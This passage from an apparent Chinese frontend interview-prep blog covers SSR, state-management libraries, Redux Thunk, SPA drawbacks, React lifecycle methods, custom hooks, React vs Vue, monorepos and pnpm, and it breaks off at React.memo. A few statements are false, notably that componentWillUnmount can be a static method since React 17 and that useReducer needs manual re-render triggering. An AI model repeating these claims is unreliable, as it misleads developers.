尽管SSR在某些情况下有明显的优势，但并不是对所有应用都适用。一些单页面应用（SPA）可能更适合采用CSR，特别是当页面具有复杂的交互和动态性时。</p></li><li><p><strong>额外的服务器负担：</strong> 实施SSR需要服务器端的额外处理工作，包括构建和维护服务器渲染的逻辑。这可能会增加服务器的负担和开发的复杂性。</p></li><li><p><strong>使用框架：</strong> 许多现代JavaScript框架和库，如Next.js（React）、Nuxt.js（Vue）、Angular Universal（Angular）等，提供了方便的SSR支持，使开发者能够相对容易地实现服务器端渲染。</p></li></ol><p>总之，服务器端渲染是一种有助于提高首次加载速度、SEO优化和性能表现的Web开发技术，但它需要仔细考虑应用程序的需求和复杂性，以确定是否适合采用SSR。不同的应用场景可能需要不同的渲染方式。</p><h3 id="6、前端的状态管理库介绍"><a href="#6、前端的状态管理库介绍" class="headerlink" title="6、前端的状态管理库介绍"></a>6、前端的状态管理库介绍</h3><p>前端状态管理库用于管理和维护应用程序的状态，以确保组件之间可以共享和同步数据。以下是一些常见的前端状态管理库，并进行简要介绍：</p><ol><li><p><strong>Redux：</strong> Redux 是一个用于 JavaScript 应用程序的可预测状态容器。它遵循单一数据源和纯函数的原则，通过创建一个全局存储（store）来管理应用程序的状态，并使用动作（actions）和 reducers 来修改状态。Redux 是 React 生态系统中最常用的状态管理库之一。</p></li><li><p><strong>Mobx：</strong> Mobx 是一个简单、可扩展且响应式的状态管理库，适用于 React、Vue 和其他 JavaScript 框架。它基于可观察对象（observable objects）和装饰器，允许你声明性地定义状态和状态之间的依赖关系。</p></li><li><p><strong>Vuex：</strong> Vuex 是用于 Vue.js 应用程序的官方状态管理库。它提供了一个集中式的状态存储，并使用 mutations 来修改状态。Vuex 集成了 Vue 组件，使得状态管理在 Vue 应用中更加简单和一致。</p></li><li><p><strong>Mobx-State-Tree（MST）：</strong> Mobx-State-Tree 是 Mobx 的扩展，用于创建可扩展的应用程序状态树。它提供了一种方式来定义和组织状态模型，并具有强大的快照和时间旅行（time-travel）调试工具。</p></li><li><p><strong>Recoil：</strong> Recoil 是 Facebook 开发的状态管理库，专为 React 应用程序设计。它引入了原子状态（atom）和选择器（selector）的概念，使得状态管理更加灵活和高效。</p></li><li><p><strong>Ngrx：</strong> Ngrx 是 Angular 生态系统中的状态管理库，它基于 Redux 架构，用于管理 Angular 应用的状态。它提供了一组强大的工具，包括 actions、reducers 和 effects，以支持复杂的状态管理需求。</p></li><li><p><strong>Zustand：</strong> Zustand 是一个微型状态管理库，适用于 React 应用程序。它提供了一个使用 React 的 Hook API 来管理状态的简单方式，没有复杂的概念和冗余的代码。</p></li><li><p><strong>Immer：</strong> Immer 不是一个状态管理库，而是一个状态更新库，它用于以不可变的方式更新 JavaScript 对象。许多状态管理库和应用程序状态管理都受益于 Immer 的简化状态更新。</p></li></ol><p>这些状态管理库都有各自的优点和适用场景，开发者可以根据项目需求和团队熟悉度来选择适合的库。无论选择哪个库，良好的状态管理能够提高应用程序的可维护性和性能，并支持复杂的数据流管理。</p><p>mobx解析：<a href="https://juejin.cn/post/7036354289215733791">https://juejin.cn/post/7036354289215733791</a></p><h5 id="对比一下Redux、Mobx、react-redux、useReducer、Mobx-State-Tree（MST）的优劣"><a href="#对比一下Redux、Mobx、react-redux、useReducer、Mobx-State-Tree（MST）的优劣" class="headerlink" title="对比一下Redux、Mobx、react redux、useReducer、Mobx-State-Tree（MST）的优劣"></a>对比一下Redux、Mobx、react redux、useReducer、Mobx-State-Tree（MST）的优劣</h5><p>以下是 Redux、Mobx、react-redux、useReducer 和 Mobx-State-Tree（MST）的优劣势对比：</p><p><strong>Redux:</strong></p><ul><li><p>优势：</p><ul><li>可以用于多种 JavaScript 框架，但在 React 中应用最广泛。</li><li>严格的单一数据源和纯函数原则，使状态变化可预测和可追踪。</li><li>丰富的生态系统，包括中间件、调试工具和社区支持。</li><li>适合大型复杂应用程序，因为它提供了强大的工具来管理状态流。</li></ul></li><li><p>劣势：</p><ul><li>有一定的学习曲线，需要理解 Redux 的概念和约定。</li><li>需要编写大量的样板代码，如 action 和 reducer。</li><li>可能会导致状态树过于冗长和复杂。</li></ul></li></ul><p><strong>Mobx:</strong></p><ul><li><p>优势：</p><ul><li>简单、直观，适合快速开发原型或小型项目。</li><li>支持响应式编程，状态自动更新。</li><li>支持多种框架，包括 React、Vue 和 Angular。</li></ul></li><li><p>劣势：</p><ul><li>可能会导致状态变得不可控，难以调试。</li><li>不够严格，可能会导致性能问题和意外行为。</li><li>缺少官方的调试工具和标准化的最佳实践。</li></ul></li></ul><p><strong>react-redux:</strong></p><ul><li><p>优势：</p><ul><li>与 React 紧密集成，使用 Hooks 和 Context API 简化了状态管理。</li><li>与 Redux 结合使用，提供了更好的可维护性和性能。</li><li>提供了 <code>useSelector</code> 和 <code>useDispatch</code> 等钩子，减少了样板代码。</li></ul></li><li><p>劣势：</p><ul><li>需要额外的库（Redux）来支持，可能会增加项目的复杂性。</li><li>仍需要编写 Redux 的 action 和 reducer。</li></ul></li></ul><p><strong>useReducer:</strong></p><ul><li><p>优势：</p><ul><li>原生 React 钩子，无需额外的库。</li><li>适用于小型应用程序或简单的状态管理需求。</li><li>状态和操作都在组件内部定义，更容易理解和维护。</li></ul></li><li><p>劣势：</p><ul><li>对于大型或复杂应用程序，需要手动处理状态的传递和组织。</li><li>不支持响应式编程，状态更新需要手动触发渲染。</li></ul></li></ul><p><strong>Mobx-State-Tree (MST):</strong></p><ul><li><p>优势：</p><ul><li>基于 Mobx，具有响应式编程的特性。</li><li>提供了模型（Model）的概念，用于定义和组织状态。</li><li>支持时间旅行调试，轻松回溯和检查状态变化。</li><li>可以用于多种框架，包括 React、Vue 和 Angular。</li></ul></li><li><p>劣势：</p><ul><li>学习曲线略高，需要理解 MST 的模型和概念。</li><li>相对较新，生态系统不如 Redux 那么丰富。</li><li>可能需要额外的配置和工作来使其适应特定的项目。</li></ul></li></ul><p>选择状态管理库取决于项目的规模、复杂性和你的团队熟悉程度。Redux 适用于大型项目，Mobx 适用于小型项目或原型开发，react-redux 提供了与 React 集成的便利性，useReducer 可以用于原生 React 应用，而 MST 提供了响应式编程和时间旅行调试的功能。在选择之前，需要仔细考虑项目的需求和团队的技能水平。</p><h3 id="7、redux-dispatch-如果有异步，怎么做？"><a href="#7、redux-dispatch-如果有异步，怎么做？" class="headerlink" title="7、redux dispatch 如果有异步，怎么做？"></a>7、redux dispatch 如果有异步，怎么做？</h3><p>在 Redux 中，如果需要在 <code>dispatch</code> 中处理异步操作，可以使用中间件来处理异步行为。最常用的中间件是 Redux Thunk，它允许你在 <code>dispatch</code> 中返回函数而不仅仅是一个普通的 action 对象。这个函数可以在其中执行异步操作，然后再触发实际的 action，从而更新 Redux store。以下是使用 Redux Thunk 处理异步操作的基本步骤：</p><ol><li><p>安装 Redux Thunk：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span> redux-thunk<br></code></pre></td></tr></table></figure></li><li><p>在 Redux store 的创建过程中应用 Redux Thunk 中间件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; createStore, applyMiddleware &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;redux&#x27;</span>;<br><span class="hljs-keyword">import</span> thunk <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;redux-thunk&#x27;</span>;<br><span class="hljs-keyword">import</span> rootReducer <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./reducers&#x27;</span>;<br><br><span class="hljs-keyword">const</span> store = <span class="hljs-title function_">createStore</span>(rootReducer, <span class="hljs-title function_">applyMiddleware</span>(thunk));<br></code></pre></td></tr></table></figure></li><li><p>创建一个 action 创建函数，它返回一个函数而不是一个普通的 action 对象。这个函数可以包含异步操作：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// actions.js</span><br><br><span class="hljs-comment">// 模拟异步操作</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchData</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title function_">resolve</span>(&#123; <span class="hljs-attr">data</span>: <span class="hljs-string">&#x27;Async data&#x27;</span> &#125;);<br>    &#125;, <span class="hljs-number">1000</span>);<br>  &#125;);<br>&#125;;<br><br><span class="hljs-comment">// 使用 Redux Thunk 处理异步操作</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchDataAction</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">async</span> (dispatch) =&gt; &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-comment">// 异步操作</span><br>      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchData</span>();<br>      <span class="hljs-comment">// 异步操作完成后触发 action</span><br>      <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_DATA_SUCCESS&#x27;</span>, <span class="hljs-attr">payload</span>: response.<span class="hljs-property">data</span> &#125;);<br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>      <span class="hljs-comment">// 异步操作失败时触发 action</span><br>      <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_DATA_FAILURE&#x27;</span>, <span class="hljs-attr">error</span>: error.<span class="hljs-property">message</span> &#125;);<br>    &#125;<br>  &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>在组件中使用 <code>dispatch</code> 调用上面创建的异步 action 创建函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// YourComponent.js</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useEffect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; useDispatch, useSelector &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-redux&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; fetchDataAction &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./actions&#x27;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">YourComponent</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useDispatch</span>();<br>  <span class="hljs-keyword">const</span> data = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> state.<span class="hljs-property">data</span>);<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// 在组件加载后调用异步 action</span><br>    <span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">fetchDataAction</span>());<br>  &#125;, [dispatch]);<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      &#123;data ? <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;data&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> : <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Loading...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">YourComponent</span>;<br></code></pre></td></tr></table></figure></li></ol><p>上述代码演示了如何使用 Redux Thunk 处理异步操作。异步 action 创建函数中的异步操作完成后，可以触发相应的 action 来更新 Redux store 中的状态。这种方式可以让你在 Redux 中处理异步操作，保持了 Redux 的单一数据源和可预测性。</p><h3 id="8、react这种单页面应用的缺点"><a href="#8、react这种单页面应用的缺点" class="headerlink" title="8、react这种单页面应用的缺点"></a>8、react这种单页面应用的缺点</h3><p>单页面应用（SPA）有很多优点，如提供了更流畅的用户体验、减少了服务器负载、提高了开发效率等，但同时也存在一些缺点，包括：</p><ol><li><p><strong>首屏加载时间较长：</strong> SPA 需要一次性加载所有的前端资源（HTML、CSS、JavaScript），因此首次加载可能会比传统多页应用慢。用户需要等待较长时间才能看到页面内容。</p></li><li><p><strong>SEO 难度较高：</strong> 搜索引擎爬虫通常难以处理基于 JavaScript 的内容，因此对于 SPA，搜索引擎优化（SEO）相对复杂。虽然可以采用一些技术手段来改善 SEO，但仍然需要额外的工作。</p></li><li><p><strong>浏览器历史管理复杂：</strong> SPA 使用前端路由来切换视图，这意味着浏览器的地址栏 URL 并不会随着页面的加载而变化。这会导致浏览器的前进和后退按钮行为不符合用户的期望，需要额外的处理来管理浏览器历史记录。</p></li><li><p><strong>内存占用较大：</strong> SPA 在用户与应用交互时会保留大量状态和页面元素在内存中，可能导致较高的内存占用，尤其是对于长时间运行的应用。</p></li><li><p><strong>初次加载慢：</strong> 除了首屏加载时间长，由于 SPA 通常需要下载大量的 JavaScript 代码，因此在初次加载时可能会占用较多带宽和时间。</p></li><li><p><strong>不适合所有场景：</strong> SPA 适用于许多应用，但并不适合所有场景。对于一些需要频繁刷新内容或对 SEO 要求较高的应用，传统多页应用可能更合适。</p></li><li><p><strong>前进&#x2F;后退刷新问题：</strong> 当用户点击浏览器的前进或后退按钮时，SPA 需要处理并加载对应的视图，这可能会导致刷新页面的延迟。</p></li><li><p><strong>技术栈选择困难：</strong> SPA 通常需要选择和配置大量的前端技术，这可能导致选择困难和技术栈的频繁变化。</p></li></ol><p>要克服这些缺点，开发人员需要在设计和开发过程中仔细考虑，并采取相应的优化和解决方案。此外，应根据具体的应用需求和用户体验要求来选择使用 SPA 还是传统多页应用。</p><h3 id="9、React生命周期"><a href="#9、React生命周期" class="headerlink" title="9、React生命周期"></a>9、React生命周期</h3><p>React 中的组件生命周期包括挂载阶段、更新阶段和卸载阶段。以下是 React 类组件的生命周期方法，以及在每个阶段触发的方法：</p><h5 id="挂载阶段（Mounting）"><a href="#挂载阶段（Mounting）" class="headerlink" title="挂载阶段（Mounting）"></a>挂载阶段（Mounting）</h5><ol><li><p><strong>constructor()：</strong> 构造函数，在组件被创建时调用。用于初始化组件的状态和绑定方法。</p></li><li><p><strong>static getDerivedStateFromProps()：</strong> 在组件实例被创建并且每次组件接收新的 props 时调用。用于根据新的 props 更新组件的状态。</p></li><li><p><strong>render()：</strong> 渲染方法，返回要渲染的 React 元素。</p></li><li><p><strong>componentDidMount()：</strong> 组件挂载完成后调用。通常在这里进行网络请求、DOM 操作、订阅事件等副作用操作。</p></li></ol><h5 id="更新阶段（Updating）"><a href="#更新阶段（Updating）" class="headerlink" title="更新阶段（Updating）"></a>更新阶段（Updating）</h5><ol start="5"><li><p><strong>static getDerivedStateFromProps()：</strong> 同样在更新阶段，也可以在组件接收新的 props 时调用，用于根据新的 props 更新组件的状态。</p></li><li><p><strong>shouldComponentUpdate()：</strong> 决定组件是否需要重新渲染，返回 <code>true</code> 表示需要重新渲染，返回 <code>false</code> 表示不需要。</p></li><li><p><strong>render()：</strong> 渲染方法，重新渲染组件。</p></li><li><p><strong>getSnapshotBeforeUpdate()：</strong> 在更新之前获取 DOM 快照。通常用于保存滚动位置等信息，返回的值会传递给 <code>componentDidUpdate</code> 方法。</p></li><li><p><strong>componentDidUpdate()：</strong> 组件更新完成后调用。通常在这里进行 DOM 操作、网络请求、订阅事件等副作用操作。</p></li></ol><h5 id="卸载阶段（Unmounting）"><a href="#卸载阶段（Unmounting）" class="headerlink" title="卸载阶段（Unmounting）"></a>卸载阶段（Unmounting）</h5><ol start="10"><li><strong>componentWillUnmount()：</strong> 组件即将卸载时调用，通常在这里取消网络请求、清除定时器、取消订阅等资源清理操作。</li></ol><h5 id="错误处理阶段（Error-Handling）"><a href="#错误处理阶段（Error-Handling）" class="headerlink" title="错误处理阶段（Error Handling）"></a>错误处理阶段（Error Handling）</h5><ol start="11"><li><p><strong>static getDerivedStateFromError()：</strong> 当子组件发生错误时调用，返回一个新的状态值以更新组件状态。</p></li><li><p><strong>componentDidCatch()：</strong> 当子组件发生错误时调用，用于记录错误信息或上报错误。</p></li></ol><p>请注意，React 16.3 版本以后引入了新的生命周期方法和错误处理机制，之前的一些生命周期方法已被标记为不推荐使用（如 <code>componentWillMount</code>、<code>componentWillReceiveProps</code> 等）。</p><p>此外，React 17 版本以后，<code>componentWillUnmount</code> 不再必须要实现为实例方法，可以作为静态方法定义。随着 React 的不断发展，生命周期方法也可能会有所调整或扩展，因此建议查看当前版本的文档以获取最新信息。</p><h3 id="10、自定义hook"><a href="#10、自定义hook" class="headerlink" title="10、自定义hook"></a>10、自定义hook</h3><p>自定义 Hook 是一种用于复用 React 组件逻辑的方式。自定义 Hook 实际上就是一个函数，它可以包含任何已有 Hook 的调用，也可以包含其他普通函数。自定义 Hook 的命名应该以 “use” 开头，以明示它是一个 Hook。以下是创建和使用自定义 Hook 的基本步骤：</p><ol><li><strong>创建自定义 Hook 函数：</strong> 创建一个以 “use” 开头的函数，例如 <code>useCustomHook</code>，在函数内部可以使用已有的 Hook，也可以定义其他逻辑。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; useState, useEffect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useCustomHook</span>(<span class="hljs-params">initialValue</span>) &#123;<br>  <span class="hljs-keyword">const</span> [value, setValue] = <span class="hljs-title function_">useState</span>(initialValue);<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// 添加副作用逻辑</span><br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = <span class="hljs-string">`Value: <span class="hljs-subst">$&#123;value&#125;</span>`</span>;<br>  &#125;, [value]);<br><br>  <span class="hljs-comment">// 返回状态值和处理函数</span><br>  <span class="hljs-keyword">return</span> [value, setValue];<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>在组件中使用自定义 Hook：</strong> 在需要使用该 Hook 的组件中引入它，并调用它。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><span class="hljs-keyword">import</span> useCustomHook <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./useCustomHook&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [value, setValue] = <span class="hljs-title function_">useCustomHook</span>(<span class="hljs-number">0</span>);<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Value: &#123;value&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setValue(value + 1)&#125;&gt;Increment<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>使用自定义 Hook：</strong> 在组件中可以像使用任何其他 Hook 一样使用自定义 Hook 返回的状态和函数。</li></ol><p>自定义 Hook 可以用于抽象和复用各种逻辑，例如数据获取、状态管理、定时器处理等。它们是一种强大的工具，有助于使 React 组件更加可维护和可重用。需要注意的是，自定义 Hook 不是组件，它们没有自己的渲染逻辑，只是用于提供状态和副作用逻辑的函数。</p><p>需要注意的是，自定义 Hook 在多个组件中使用时，每个组件都会有自己的 Hook 实例，它们互相独立，不会共享状态。这意味着自定义 Hook 可以在不同组件中复用，每个组件都拥有自己的状态和副作用逻辑。</p><h3 id="11、React和Vue的区别"><a href="#11、React和Vue的区别" class="headerlink" title="11、React和Vue的区别"></a>11、React和Vue的区别</h3><p>React 和 Vue 是两个流行的前端 JavaScript 框架（或库），它们都用于构建用户界面，但在一些方面有不同的设计和特点。以下是 React 和 Vue 的主要区别：</p><ol><li><p><strong>生态系统和社区支持</strong>：</p><ul><li>React 是由 Facebook 开发并维护的，拥有庞大的社区和生态系统，有大量的第三方库和组件可供选择。</li><li>Vue 由一个名为尤雨溪的开发者创建，也有强大的社区支持，但相对于 React 来说规模稍小。Vue 的核心库和官方插件由 Vue 团队维护，保持了一致性。</li></ul></li><li><p><strong>学习曲线</strong>：</p><ul><li>React 通常被认为有更陡峭的学习曲线，因为它更加灵活，需要更多的配置和理解。React 应用通常使用 JSX（JavaScript XML）编写，这可能需要一些时间来适应。</li><li>Vue 被认为更容易学习，因为它提供了一种声明式的模板语法，更接近传统的 HTML 和 CSS。Vue 的文档也被认为非常友好。</li></ul></li><li><p><strong>数据绑定</strong>：</p><ul><li>React 使用了一种称为单向数据流的模式。数据从父组件传递到子组件，并且子组件不能直接修改父组件的数据。为了更新视图，React 使用了 Virtual DOM，通过比较前后两次渲染的 Virtual DOM 树来高效地更新实际 DOM。</li><li>Vue 使用了双向数据绑定，允许开发者更容易地将视图和数据同步。这使得在 Vue 中编写表单和处理表单输入更加直观。</li></ul></li><li><p><strong>组件化</strong>：</p><ul><li>React 和 Vue 都支持组件化开发，但它们的实现方式有所不同。</li><li>React 使用 JavaScript 类来定义组件，组件的状态和生命周期方法在类中定义。</li><li>Vue 使用 <code>.vue</code> 单文件组件，将组件的模板、样式和逻辑组合在一个文件中。</li></ul></li><li><p><strong>状态管理</strong>：</p><ul><li>React 可以使用上下文（Context）、Redux、Mobx 等状态管理库来处理全局状态。这些库提供了一种可预测的状态管理方案。</li><li>Vue 有内置的状态管理方案，称为 Vuex，可以用于管理全局状态。</li></ul></li><li><p><strong>生态工具</strong>：</p><ul><li>React 配套了一些工具，如 Create React App、React Router、Redux Toolkit 等，用于加速开发和管理 React 应用。</li><li>Vue 配套了 Vue CLI、Vue Router、Vuex 等工具，同样用于创建、构建和管理 Vue 应用。</li></ul></li><li><p><strong>灵活性</strong>：</p><ul><li>React 更加灵活，开发者需要手动处理许多细节，如组件通信和状态管理。</li><li>Vue 提供了更多的约定和默认行为，使得开发者可以更快地构建应用，但可能会在一些特定需求下失去一些灵活性。</li></ul></li></ol><p>总的来说，React 和 Vue 都是强大的前端框架，它们在不同的情况下都有优势。选择哪一个取决于项目需求、团队经验和个人偏好。一些开发者更喜欢 React 的灵活性，而另一些人则更喜欢 Vue 的直观性。无论选择哪一个，都需要深入学习框架的特性和最佳实践以提高开发效率。</p><h3 id="12、monorepo"><a href="#12、monorepo" class="headerlink" title="12、monorepo"></a>12、monorepo</h3><p>Monorepo（单一代码库仓库）是一种软件开发组织结构的概念，它将多个相关项目或软件模块存储在同一个版本控制仓库中。这个仓库通常包含多个子项目，每个子项目都可以是一个独立的应用程序、库、模块或组件。Monorepo 的目标是通过统一的工作流程、版本控制和协作方式来简化多个项目之间的管理和开发。</p><p>以下是 Monorepo 的主要特点和优势：</p><ol><li><p><strong>统一版本控制：</strong> 所有子项目都共享同一个版本控制仓库，这意味着它们都处于相同的开发和发布周期。这有助于确保不同项目之间的依赖关系保持一致。</p></li><li><p><strong>共享代码和依赖：</strong> 子项目可以共享代码和依赖项。这可以减少重复代码的使用，提高代码的重用性，并简化依赖管理。</p></li><li><p><strong>一致的构建和部署：</strong> 通过统一的构建系统和部署流程，可以确保所有子项目都遵循相同的标准。这可以减少构建和部署的复杂性。</p></li><li><p><strong>跨项目协作：</strong> 开发团队可以更轻松地在不同子项目之间协作，因为它们都在同一个代码库中。这有助于提高团队的协作效率。</p></li><li><p><strong>简化维护：</strong> 维护一个单一的 Monorepo 通常比维护多个独立的仓库更容易，因为它避免了多个仓库之间的不一致性和复杂性。</p></li><li><p><strong>更好的版本管理：</strong> Monorepo 可以更容易地管理不同项目之间的依赖关系和版本控制。这有助于解决版本冲突和依赖问题。</p></li><li><p><strong>提高构建和测试速度：</strong> 共享构建工具和测试工具可以提高构建和测试速度，因为它们可以跨多个项目并行运行。</p></li></ol><p>Monorepo 并不适用于所有项目，特别是对于大型项目或拥有不同发布周期和开发团队的项目，可能会更复杂。选择是否使用 Monorepo 取决于项目的具体需求和团队的工作流程。一些著名的 Monorepo 工具包括 Lerna、Yarn Workspaces 和 Bazel。</p><h3 id="13、pnpm"><a href="#13、pnpm" class="headerlink" title="13、pnpm"></a>13、pnpm</h3><p><code>pnpm</code> 是一个 JavaScript 项目的包管理工具，类似于 <code>npm</code> 和 <code>Yarn</code>。它的名称代表 “fast, disk space efficient package manager”（快速、节省磁盘空间的包管理工具）。</p><p>与传统的 <code>npm</code> 或 <code>Yarn</code> 不同，<code>pnpm</code> 采用了一种不同的包管理策略，主要包括以下特点：</p><ol><li><p><strong>硬链接（Hard Links）：</strong> <code>pnpm</code> 使用硬链接技术来共享依赖项之间的文件。这意味着相同的依赖项在磁盘上只存储一次，从而减少了磁盘空间的浪费。</p></li><li><p><strong>全局缓存：</strong> <code>pnpm</code> 使用全局缓存来存储所有项目的依赖项。这意味着如果多个项目依赖相同的包，它们可以共享缓存，减少了重复下载。</p></li><li><p><strong>并行安装：</strong> <code>pnpm</code> 具有并行安装的能力，可以同时下载和安装多个依赖项，从而提高了安装速度。</p></li><li><p><strong>版本管理：</strong> 与 <code>Yarn</code> 类似，<code>pnpm</code> 支持锁定依赖项的版本，以确保在不同环境中获得相同的依赖项版本。</p></li><li><p><strong>自我更新：</strong> <code>pnpm</code> 具有自我更新的功能，可以保持工具本身的最新版本。</p></li></ol><p>总的来说，<code>pnpm</code> 的设计旨在减少磁盘占用和提高包的安装和管理速度。它特别适用于大型项目或具有大量依赖项的项目，因为它可以显著减少磁盘空间的浪费，并加快安装过程。</p><p>要开始使用 <code>pnpm</code>，你可以通过 npm 安装它，然后使用 <code>pnpm</code> 命令来代替 <code>npm</code> 或 <code>yarn</code> 来管理你的项目依赖。例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 全局安装 pnpm</span><br>npm install -g pnpm<br><br><span class="hljs-comment"># 在项目中使用 pnpm 安装依赖</span><br>pnpm install<br></code></pre></td></tr></table></figure><p><code>pnpm</code> 提供了一种新的方式来管理 JavaScript 项目的依赖项，但你应该根据自己的项目需求和团队的工作流程来决定是否使用它。</p><h3 id="14、React-memo怎么实现的"><a href="#14、React-memo怎么实现的" class="headerlink" title="14、React.memo怎么实现的"></a>14、React.memo怎么实现的</h3><p><code>React.memo</code> 是 React 提供的一个高阶组件（Higher-Order 